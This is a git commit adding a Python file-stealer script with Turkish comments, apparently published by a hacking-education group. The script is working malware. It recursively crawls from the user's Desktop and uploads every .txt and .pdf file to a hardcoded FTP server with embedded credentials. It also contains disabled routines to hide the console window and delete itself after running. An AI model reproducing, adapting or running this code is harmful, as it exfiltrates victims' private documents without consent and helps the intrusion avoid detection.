4b013b7d5404f7230888407fb34a1e1361772088
KekikAkademi <kekikakademi@yaani.com>
2020-02-16 09:29:45 +0300

    7-Kekik-File-Stealer

---
+++ 7-Kekik-File-Stealer/Sade.py
@@ -0,0 +1,79 @@
+#!/usr/bin/env python
+#! -*- coding: utf-8 -*-
+# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.
+
+import re,os,sys,platform           # Kullanacağımız modüller(kütüphaneler)
+from ftplib import FTP              # FTP işlemleri için kütüphane
+
+
+NerdeBasladik = os.getcwd()         # Başlanılan dizini tanımladık / Betik işini bitirince, betiği imha edeceğiz.
+SistemKullaniciAdi = os.getlogin()  # Betiğin çalıştığı oturum ismini tanımladık / Dosyaları nerden aldığımızı bileceğiz.
+
+FTP_Sunucu = "192.168.1.134"                            # FTP adresimizi tanımladık
+FTP_Kullanıcı = "kekikakademi"                          # FTP kullanıcı adımızı tanımladık
+FTP_Sifre = "kekik"                                     # FTP şifremizi tanımladık
+FTPBaglantisi = FTP(FTP_Sunucu,FTP_Kullanıcı,FTP_Sifre) # FTP sunucumuza bağlandık
+
+
+def WindowsTerminaliGizle(): # Windows'da betiği çalıştırdıktan sonra terminalin görünmez olması için metodumuz
+    import win32console, win32gui
+    Terminal = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(Terminal, 0)
+
+
+Kullanıcı_Dizini = os.getenv("USERPROFILE") # Kullanıcının bulunduğu dizini tanımladık
+print("\tİşte Sana Kullanıcı Dizini >> " + Kullanıcı_Dizini)
+
+Calinacak_Dizin = Kullanıcı_Dizini + f"\\Desktop\\" # Kullanıcının masaüstünü tanımladık
+print("\n\tAma Ben Artık Burdayım;")
+print(Calinacak_Dizin)
+
+Ayristirici = Calinacak_Dizin.split("\\") # Calinacak_Dizin yolunu, Windows için > "\\" ile ayrıştırarak listeye çevirdik. Linux için > "/"
+print("\n\tİşte Bulunduğum Dizinin Listelenmiş Hali;")
+print(Ayristirici)
+
+print("\n\tTarama Başlıyor..\n")
+
+sayi = len(Ayristirici) - 1 # Listenin sonuncu(boş) elemanını hikayeden çıkardık
+for i in range(3, sayi):    # ['C:', 'Users', 'kekik', 'Desktop', ''] listesinden 3. olan desktop'ı tanımladık
+    os.chdir(os.pardir)     # os.chdir() (change directory) ile dizin değiştirdik >> os.pardir (parent directory) bir üst dizin ile
+
+Girilen_Dizinler = [] # Girilen Dizinler için boş liste oluşturduk
+
+def BulunanDizin(Gelen_Dizin): # BulunanDizin metodumuz ve alınan Gelen_Dizin verisi
+    os.chdir(Gelen_Dizin) # Dizin değiştir, Gelen_Dizin ile
+    print("Bu Dizindeyim >> " + os.getcwd()) # Calinacak_Dizin + Gelen_Dizin
+    Girilen_Dizinler.append(Gelen_Dizin) # Girilen_Dizinler listesine ekle, Gelen_Dizin'leri
+    KontrolEt()
+    os.chdir(os.pardir)
+
+def KontrolEt(): # KontrolEt metodumuzu oluşturduk
+    Dosyalar = os.listdir(os.getcwd()) # os.getcwd() (current working directory) şuan çalışılan dizindeki dosyaları(os.listdir) tanımladık
+    for i in Dosyalar: # Dosyaları döngüye aldık
+        try:
+            if re.match(".*txt", i): # Eğer txt ile biten dosya varsa
+                print("\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n")
+                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb"))
+            elif re.match(".*pdf", i): # Eğer pdf ile biten dosya varsa
+                print("\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + i + "\n")
+                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb"))
+            elif os.path.isdir(i): # i döngüsünde dosya yok ise
+                if Girilen_Dizinler.count(i) == 0: # Girilen_Dizinler listesini başa al
+                    BulunanDizin(i) # BulunanDizin metodunu i döngüsü ile başlat
+                else:
+                    pass # yoksay
+            else:
+                pass # yoksay
+        except Exception as HATA: # Hata var ise
+            print("\n\t[!] Bir hata ile karşılaşıldı! [!]\n") # Hata Var
+            print(HATA) # Tanımlanan hatayı ekrana yazdır
+            sys.exit("\nBetik Kapatıldı!") # Betikten çıkış yap
+
+def KendiniYokEt(): # Kendini imha etme metodumuz
+    os.chdir(NerdeBasladik) # Dizin değiştir, başladığımız yer ile
+    os.remove(sys.argv[0]) # Betiği imha et
+
+# Betik Çalışmaya Başlasın!
+#WindowsTerminaliGizle()
+KontrolEt()
+#KendiniYokEt()
